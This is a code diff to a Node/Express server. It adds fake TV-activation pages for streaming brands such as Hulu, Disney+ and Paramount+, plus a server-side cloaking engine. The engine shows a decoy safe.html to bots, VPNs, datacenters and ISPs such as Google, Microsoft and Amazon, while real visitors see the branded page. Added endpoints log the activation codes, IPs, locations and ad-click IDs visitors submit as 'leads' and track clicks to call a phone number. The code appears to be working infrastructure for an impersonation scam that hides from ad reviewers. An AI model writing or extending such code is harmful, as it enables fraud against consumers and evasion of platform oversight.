@@ -266,6 +266,52 @@ const BOT_PATTERNS = [
 
 const SUSP_ISP = ['google','amazon','microsoft','cloudflare','digitalocean','linode','vultr','ovh','hetzner','facebook','apple'];
 
+// ─── CHANNEL CATALOG ─────────────────────────────────────────────────────────
+const CHANNELS_META = [
+  { slug: 'paramount-plus',   name: 'Paramount+'   },
+  { slug: 'hulu',             name: 'Hulu'         },
+  { slug: 'disney-plus',      name: 'Disney+'      },
+  { slug: 'espn-plus',        name: 'ESPN+'        },
+  { slug: 'espn-unlimited',   name: 'ESPN Unlimited' },
+  { slug: 'fox-nation',       name: 'Fox Nation'   },
+  { slug: 'fox-one',          name: 'Fox One'      },
+  { slug: 'fox-sports',       name: 'Fox Sports'   },
+  { slug: 'peacock-tv',       name: 'Peacock TV'   },
+  { slug: 'starz',            name: 'STARZ'        },
+  { slug: 'vizio-tv',         name: 'VIZIO TV+'    }
+];
+const CHANNEL_SLUGS = new Set(CHANNELS_META.map(c => c.slug));
+
+async function ensureChannelSites() {
+  let added = 0;
+  for (const ch of CHANNELS_META) {
+    if (!_cacheSites.some(s => s.channelSlug === ch.slug)) {
+      _cacheSites.push({
+        ...defaultSite(),
+        id: 'channel-' + ch.slug,
+        name: ch.name,
+        domain: 'entermytvcode.com',
+        channelSlug: ch.slug,
+        isDefault: false
+      });
+      added++;
+    }
+  }
+  if (!_cacheSites.some(s => s.isDefault)) {
+    _cacheSites[0].isDefault = true;
+  }
+  if (added) {
+    await saveSites();
+    console.log('[FILTER] Seeded ' + added + ' channel sites');
+  }
+}
+
+function getChannelSite(slug) {
+  return _cacheSites.find(s => s.channelSlug === slug)
+      || _cacheSites.find(s => s.isDefault)
+      || _cacheSites[0];
+}
+
 // ─── CLOAKING ENGINE ──────────────────────────────────────────────────────────
 async function runCloakChecks(ip, body, site, settings) {
   const ua  = (body.ua || '').substring(0, 500);
@@ -365,6 +411,102 @@ async function runCloakChecks(ip, body, site, settings) {
   function finish(dec, rsn, iData, fp) {
     return { decision: dec, reason: rsn, ipData: iData, fp };
   }
+}
+
+// ─── SERVER-SIDE CLOAKING (no client fingerprint) ────────────────────────────
+// Used for first-paint cloaking of channel pages — only does IP/UA/country/ISP
+// checks; skips screen/plugins/webdriver checks (those need browser-side data).
+async function runServerCloakChecks(ip, ua, referer, site, settings) {
+  const fpStub = { ua, sw: 0, sh: 0, wd: false, pl: 0, tz: '', pg: '' };
+  const siteSettings = {
+    botBlocking:    site.botBlocking    !== undefined ? site.botBlocking    : settings.botBlocking,
+    vpnBlocking:    site.vpnBlocking    !== undefined ? site.vpnBlocking    : settings.vpnBlocking,
+    proxyBlocking:  site.proxyBlocking  !== undefined ? site.proxyBlocking  : settings.proxyBlocking,
+    repeatBlocking: site.repeatBlocking !== undefined ? site.repeatBlocking : settings.repeatBlocking,
+    ispBlocking:    site.ispBlocking    !== undefined ? site.ispBlocking    : settings.ispBlocking,
+    countryBlocking:site.countryBlocking!== undefined ? site.countryBlocking: settings.countryBlocking,
+    ispKeywords:    [...(settings.ispKeywords||[]), ...(site.ispKeywords||[])],
+    allowedCountries: site.allowedCountries && site.allowedCountries.length
+      ? site.allowedCountries : (settings.allowedCountries || [])
+  };
+
+  if (!site.enabled || !settings.enabled) {
+    return { decision: 'allow', reason: 'disabled', ipData: {}, fp: fpStub };
+  }
+  const blockedIps = [...(site.blockedIps||[]), ...(settings.blockedIps||[])];
+  if (blockedIps.includes(ip)) {
+    return { decision: 'block', reason: 'manual-block', ipData: {}, fp: fpStub };
+  }
+  if (siteSettings.botBlocking && BOT_PATTERNS.some(p => p.test(ua))) {
+    return { decision: 'block', reason: 'bot-ua', ipData: {}, fp: fpStub };
+  }
+  // Repeat-click (24h) — keyed on IP+slug to allow same user to visit multiple channels
+  const fk = ip + '|' + (fpStub.pg || referer);
+  const now = Date.now();
+  if (siteSettings.repeatBlocking && ipFreqStore.has(fk)) {
+    const last = ipFreqStore.get(fk);
+    if (now - last < 24 * 3600 * 1000) {
+      ipFreqStore.set(fk, now);
+      return { decision: 'block', reason: 'repeat-click', ipData: {}, fp: fpStub };
+    }
+  }
+  if (ipFreqStore.size >= 10000) {
+    const first = ipFreqStore.keys().next().value;
+    ipFreqStore.delete(first);
+  }
+  ipFreqStore.set(fk, now);
+
+  const ipData = await ipLookup(ip);
+  if (!ipData.countryCode) ipData.countryCode = 'XX';
+
+  if (siteSettings.countryBlocking && siteSettings.allowedCountries.length > 0) {
+    if (!siteSettings.allowedCountries.includes(ipData.countryCode)) {
+      return { decision: 'block', reason: 'country-block', ipData, fp: fpStub };
+    }
+  }
+  if (siteSettings.ispBlocking) {
+    const ispStr = ((ipData.isp||'') + ' ' + (ipData.org||'')).toLowerCase();
+    const keywords = [...SUSP_ISP, ...siteSettings.ispKeywords.map(k => k.toLowerCase())];
+    if (keywords.some(k => k && ispStr.includes(k))) {
+      return { decision: 'block', reason: 'suspicious-isp', ipData, fp: fpStub };
+    }
+  }
+  if (siteSettings.vpnBlocking && ipData.proxy) {
+    return { decision: 'block', reason: 'proxy-vpn', ipData, fp: fpStub };
+  }
+  if (siteSettings.proxyBlocking && ipData.hosting) {
+    return { decision: 'block', reason: 'datacenter', ipData, fp: fpStub };
+  }
+  return { decision: 'allow', reason: 'ok', ipData, fp: fpStub };
+}
+
+// Handle a channel page request with server-side cloaking.
+// Allowed -> serve the channel HTML.  Blocked -> serve safe.html.
+async function handleChannelPage(req, res, slug) {
+  const ip      = getIP(req);
+  const ua      = (req.headers['user-agent'] || '').substring(0, 500);
+  const referer = (req.headers.referer || '').substring(0, 300);
+  const site    = getChannelSite(slug);
+  const settings = _cacheSettings;
+  let result;
+  try {
+    result = await runServerCloakChecks(ip, ua, referer, site, settings);
+  } catch (e) {
+    console.error('[channel cloak]', e.message);
+    result = { decision: 'allow', reason: 'error', ipData: {}, fp: { ua, sw:0, sh:0, wd:false, pl:0, tz:'', pg: slug } };
+  }
+  result.fp.pg = slug;
+  // Log every visit (don't await — keep response fast)
+  logVisit(ip, site, result).catch(e => console.error('[logVisit]', e.message));
+
+  const file = result.decision === 'block' ? 'safe.html' : (slug + '.html');
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+  return res.sendFile(path.join(__dirname, 'public', file), err => {
+    if (err) {
+      console.error('[sendFile]', file, err.message);
+      res.status(404).send('Not found');
+    }
+  });
 }
 
 async function logVisit(ip, site, result) {
@@ -633,6 +775,20 @@ app.use(session({
     maxAge: 8 * 60 * 60 * 1000
   }
 }));
+// ─── CHANNEL CLOAKER (must be BEFORE express.static) ────────────────────────
+// Intercepts GET /<channel-slug> and /<channel-slug>.html for the 11 channel
+// pages.  All other paths fall through to express.static / route handlers.
+app.use(async (req, res, next) => {
+  if (req.method !== 'GET') return next();
+  let p = req.path.slice(1); // strip leading '/'
+  if (p.endsWith('.html')) p = p.slice(0, -5);
+  if (CHANNEL_SLUGS.has(p)) {
+    try { return await handleChannelPage(req, res, p); }
+    catch (e) { console.error('[channel mw]', e.message); return next(); }
+  }
+  next();
+});
+
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ─── ADMIN AUTH MIDDLEWARE ─────────────────────────────────────────────────────
@@ -662,7 +818,94 @@ app.post('/api/v1/pixel', async (req, res) => {
   }
 });
 
-// ─── PUBLIC API — EVENTS ──────────────────────────────────────────────────────
+// ─── PUBLIC API — CODE SUBMIT (channel funnel step 1 -> 2) ──────────────────
+// First-party endpoint used by /public/activate.js.  Resolves the site by
+// channel slug (no apiKey required since this is hosted on entermytvcode.com).
+app.post('/api/v1/code-submit', async (req, res) => {
+  res.json({ ok: true });
+  try {
+    const ip = getIP(req);
+    const body = req.body || {};
+    const channel = (body.channel || '').toString().substring(0, 50);
+    const site = getChannelSite(channel);
+    const ipData = await ipLookup(ip);
+    const lead = {
+      ts: new Date().toISOString(), ip,
+      site_id: site ? site.id : 'unknown',
+      type: 'code_submit',
+      country: ipData.countryCode || 'XX',
+      city: ipData.city || '', region: ipData.regionName || '',
+      isp: ipData.isp || '', org: ipData.org || '',
+      ua: (req.headers['user-agent'] || '').substring(0, 500),
+      code: (body.code || '').toString().substring(0, 20).toUpperCase(),
+      screen: (body.screen || '').toString().substring(0, 30),
+      tz: (body.tz || '').toString().substring(0, 100),
+      utm_source:   (body.utm_source   || '').toString().substring(0, 100),
+      utm_campaign: (body.utm_campaign || '').toString().substring(0, 100),
+      utm_medium:   (body.utm_medium   || '').toString().substring(0, 100),
+      utm_content:  (body.utm_content  || '').toString().substring(0, 100),
+      utm_term:     (body.utm_term     || '').toString().substring(0, 100),
+      gclid:        (body.gclid        || '').toString().substring(0, 100),
+      referrer: (body.referrer || req.headers.referer || '').toString().substring(0, 300),
+      called: false
+    };
+    await saveLead(lead);
+    broadcast('statsUpdate', getQuickStats());
+  } catch (e) { console.error('[code-submit]', e.message); }
+});
+
+// ─── PUBLIC API — CALL CLICK (channel funnel CTA) ────────────────────────────
+app.post('/api/v1/call-click', async (req, res) => {
+  res.json({ ok: true });
+  try {
+    const ip = getIP(req);
+    const body = req.body || {};
+    const channel = (body.channel || '').toString().substring(0, 50);
+    const site = channel ? getChannelSite(channel) : null;
+    const cutoff = new Date(Date.now() - 60 * 60 * 1000).toISOString();
+    const idx = _cacheLeads.findIndex(l =>
+      l.ip === ip && l.ts >= cutoff && (!site || l.site_id === site.id)
+    );
+    if (idx !== -1) {
+      _cacheLeads[idx].called = true;
+      _cacheLeads[idx].called_at = new Date().toISOString();
+      if (pool) {
+        const params = [_cacheLeads[idx].called_at, ip, cutoff];
+        let where = 'ip=$2 AND ts>=$3';
+        if (site) { where += ' AND site_id=$4'; params.push(site.id); }
+        await dbQuery(
+          `UPDATE cloaker_leads SET called=true, called_at=$1
+           WHERE id = (SELECT id FROM cloaker_leads WHERE ${where} ORDER BY ts DESC LIMIT 1)`,
+          params
+        );
+      }
+      if (!pool) writeJson('leads.json', _cacheLeads.slice(0, 500));
+      broadcast('newLead', _cacheLeads[idx]);
+    } else {
+      // No prior code submit found (user clicked Call without entering code) — log a stand-alone call lead
+      const ipData = await ipLookup(ip);
+      const lead = {
+        ts: new Date().toISOString(), ip,
+        site_id: site ? site.id : 'unknown',
+        type: 'call_click',
+        country: ipData.countryCode || 'XX',
+        city: ipData.city || '', region: ipData.regionName || '',
+        isp: ipData.isp || '', org: ipData.org || '',
+        ua: (req.headers['user-agent'] || '').substring(0, 500),
+        code: '(call-only)',
+        screen: '', tz: '',
+        utm_source: '', utm_campaign: '', utm_medium: '',
+        utm_content: '', utm_term: '', gclid: '',
+        referrer: (req.headers.referer || '').substring(0, 300),
+        called: true, called_at: new Date().toISOString()
+      };
+      await saveLead(lead);
+    }
+    broadcast('statsUpdate', getQuickStats());
+  } catch (e) { console.error('[call-click]', e.message); }
+});
+
+// ─── PUBLIC API — EVENTS (legacy / 3rd-party site script) ────────────────────
 app.post('/api/v1/event', async (req, res) => {
   res.json({ ok: true });
   const apiKey = req.headers['x-client-id'] || req.headers['x-site-key'];
@@ -837,6 +1080,7 @@ app.get('/' + ADMIN_PATH + '/api/logs', requireAdmin, (req, res) => {
   let logs = [..._cacheLogs];
   if (req.query.decision && req.query.decision !== 'all') logs = logs.filter(l => l.decision === req.query.decision);
   if (req.query.site && req.query.site !== 'all') logs = logs.filter(l => l.site_id === req.query.site);
+  if (req.query.channel && req.query.channel !== 'all') logs = logs.filter(l => (l.page||'') === req.query.channel);
   if (req.query.q) { const q = req.query.q.toLowerCase(); logs = logs.filter(l => (l.ip||'').includes(q)||(l.isp||'').toLowerCase().includes(q)||(l.city||'').toLowerCase().includes(q)||(l.country||'').toLowerCase().includes(q)); }
   if (req.query.date) logs = logs.filter(l => l.ts && l.ts.slice(0,10) === req.query.date);
   const total = logs.length;
@@ -850,6 +1094,10 @@ app.get('/' + ADMIN_PATH + '/api/leads', requireAdmin, (req, res) => {
   const per = 50;
   let leads = [..._cacheLeads];
   if (req.query.site && req.query.site !== 'all') leads = leads.filter(l => l.site_id === req.query.site);
+  if (req.query.channel && req.query.channel !== 'all') {
+    const targetSite = _cacheSites.find(s => s.channelSlug === req.query.channel);
+    if (targetSite) leads = leads.filter(l => l.site_id === targetSite.id);
+  }
   const total = leads.length;
   const items = leads.slice((page-1)*per, page*per);
   res.json({ items, total, page, pages: Math.ceil(total/per) });
@@ -1497,6 +1745,7 @@ textarea.inp{min-height:100px;resize:vertical;}
         <input type="text" class="inp" style="flex:1;min-width:160px;" placeholder="Search IP, ISP, city..." id="log-search" oninput="debounceLoadLogs()">
         <select id="log-decision" onchange="loadLogs(1)"><option value="all">All</option><option value="allow">Allowed</option><option value="block">Blocked</option></select>
         <select id="log-site" onchange="loadLogs(1)"><option value="all">All Sites</option>${sites.map(s=>`<option value="${escHtml(s.id)}">${escHtml(s.name)}</option>`).join('')}</select>
+        <select id="log-channel" onchange="loadLogs(1)"><option value="all">All Channels</option>${CHANNELS_META.map(c=>`<option value="${escHtml(c.slug)}">${escHtml(c.name)}</option>`).join('')}</select>
         <input type="date" class="inp" id="log-date" onchange="loadLogs(1)" style="width:160px;">
       </div>
       <div class="tbl-card">
@@ -1517,6 +1766,9 @@ textarea.inp{min-height:100px;resize:vertical;}
         <h2>Leads</h2>
         <a href="/${escHtml(adminPath)}/export-leads" class="btn btn-ghost btn-sm">Export CSV</a>
         <button class="btn btn-danger btn-sm" onclick="clearLeads()">Clear Leads</button>
+      </div>
+      <div class="filter-row">
+        <select id="lead-channel" onchange="loadLeads(1)"><option value="all">All Channels</option>${CHANNELS_META.map(c=>`<option value="${escHtml(c.slug)}">${escHtml(c.name)}</option>`).join('')}</select>
       </div>
       <div class="tbl-card">
         <div class="tbl-head"><h3>Code Submissions</h3><span class="badge gray" id="leads-total-badge">—</span></div>
@@ -1717,10 +1969,18 @@ window.addEventListener('hashchange', () => {
   if (sec && document.getElementById('sec-'+sec)) goSec(sec);
 });
 window.addEventListener('load', () => {
-  const h = window.location.hash.slice(1);
-  if (h && document.getElementById('sec-'+h)) goSec(h);
-  else goSec('dashboard');
-  startClock(); loadStats(); setupSSE(); updateCloakStatus();
+  try {
+    const h = window.location.hash.slice(1);
+    if (h && document.getElementById('sec-'+h)) goSec(h);
+    else goSec('dashboard');
+  } catch(e) { console.error('[onload nav]', e); try { goSec('dashboard'); } catch(_){} }
+  try { startClock(); }       catch(e) { console.error('[clock]', e); }
+  try { loadStats(); }        catch(e) { console.error('[loadStats]', e); }
+  try { setupSSE(); }         catch(e) { console.error('[sse]', e); }
+  try { updateCloakStatus(); } catch(e) { console.error('[cloakStatus]', e); }
+});
+window.addEventListener('error', e => {
+  console.error('[window.error]', e.message, 'at', e.filename + ':' + e.lineno);
 });
 
 function refreshCurrentSection() {
@@ -1927,8 +2187,9 @@ function loadLogs(page) {
   const q = document.getElementById('log-search').value;
   const dec = document.getElementById('log-decision').value;
   const site = document.getElementById('log-site').value || globalSiteFilter;
+  const channel = (document.getElementById('log-channel')||{}).value || 'all';
   const date = document.getElementById('log-date').value;
-  let url = '/' + ADMIN_PATH + '/api/logs?page='+logPage+'&q='+encodeURIComponent(q)+'&decision='+dec+'&site='+site;
+  let url = '/' + ADMIN_PATH + '/api/logs?page='+logPage+'&q='+encodeURIComponent(q)+'&decision='+dec+'&site='+site+'&channel='+encodeURIComponent(channel);
   if (date) url += '&date='+date;
   fetch(url).then(r=>r.json()).then(d => {
     document.getElementById('log-total-badge').textContent = d.total + ' entries';
@@ -1988,7 +2249,8 @@ function blockIPQuick(ip) {
 function loadLeads(page) {
   leadPage = page || leadPage;
   const site = globalSiteFilter;
-  fetch('/' + ADMIN_PATH + '/api/leads?page='+leadPage+'&site='+site)
+  const channel = (document.getElementById('lead-channel')||{}).value || 'all';
+  fetch('/' + ADMIN_PATH + '/api/leads?page='+leadPage+'&site='+site+'&channel='+encodeURIComponent(channel))
     .then(r=>r.json()).then(d => {
       document.getElementById('leads-total-badge').textContent = d.total + ' leads';
       document.getElementById('leads-tbody').innerHTML = d.items.map(l => leadRow(l)).join('');
@@ -2328,8 +2590,11 @@ async function start() {
   await initPassword();
   await initDB();
   await loadCaches();
+  await ensureChannelSites();
   console.log('[FILTER] Admin path: /' + ADMIN_PATH);
   console.log('[FILTER] DB:', pool ? 'PostgreSQL' : 'JSON fallback');
+  console.log('[FILTER] Sites:', _cacheSites.length, '| Channel sites:',
+    _cacheSites.filter(s => s.channelSlug).length);
   app.listen(PORT, '0.0.0.0', () => {
     console.log('[FILTER] Running on port ' + PORT);
   });
